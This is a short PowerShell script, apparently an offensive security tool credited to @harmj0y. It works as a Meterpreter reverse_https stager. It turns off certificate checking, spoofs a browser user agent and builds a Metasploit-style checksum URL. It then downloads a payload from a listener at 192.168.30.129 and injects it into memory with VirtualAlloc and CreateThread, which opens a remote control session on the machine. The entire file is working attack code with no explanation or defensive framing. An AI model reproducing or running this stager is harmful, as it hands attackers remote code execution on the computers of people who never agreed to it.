#
# PowerShell windows/meterpreter/reverse_https stager 
#   (doesn't rely on shellcode)
#
# By: @harmj0y
#

$code = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
$charList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function checksum8($val){
    return (([int[]] $val.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)
}
function randomString {
    $output = "";
    1..3 | foreach-object { $output += $charList[(get-random -maximum $charList.Length)] };
    return $output;
}
function sort-random {
    process {[array]$x = $x + $_}
    end {$x | sort-object {(new-object Random).next()}}
}
function genHTTPChecksum{
    for ($i=0; $i -lt 64; $i++){
        $baseString = randomString
        $randList = $charList | sort-random
        foreach ($element in $randList)
        {
            $s = $baseString + $element
            if (checksum8($s)) { return $s }
        }
    }
    return "9vXU"
}

[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$userAgent = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("user-agent", $userAgent)
$checksum = genHTTPChecksum
[Byte[]] $payload = $wc.DownloadData("https://192.168.30.129:443/" + $checksum)

$ptr = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru

# standard virtualalloc/copy/create thread pattern to inject the meterpreter .DLL
$x=$ptr::VirtualAlloc(0,$payload.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, [IntPtr]($x.ToInt32()), $payload.Length)
$ptr::CreateThread(0,0,$x,0,0,0) | out-null
Start-Sleep -Second 86400
